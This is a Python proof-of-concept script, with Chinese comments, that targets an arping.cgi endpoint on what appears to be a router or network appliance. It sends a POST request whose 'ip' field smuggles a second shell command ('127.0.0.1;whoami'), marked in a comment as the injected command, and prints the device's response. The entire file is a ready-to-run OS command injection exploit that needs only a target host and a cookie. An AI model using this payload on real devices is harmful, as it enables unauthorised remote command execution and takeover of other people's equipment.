import requests

# 目标URL
url = "https://<target_host>/cgi-bin/system/arping.cgi"  # <target_host>替换为实际的目标主机

headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "keep-alive",
    "Cookie": "",  # 在这里添加Cookie
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "frame",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
}

# 请求体
data = {
    "moduleid": "150",
    "tasknum": "1",
    "ip": "127.0.0.1;whoami",  # 注入的命令
    "interface": "wan0",
    "count": "4",
    "sip": "8.8.8.8",
    "x": "58",
    "y": "16",
}

try:
    # 发送POST请求
    response = requests.post(url, headers=headers, data=data, verify=False)

    # 输出响应内容
    print("Response Code:", response.status_code)
    print("Response Body:", response.text)

except requests.exceptions.RequestException as e:
    print("An error occurred:", e)
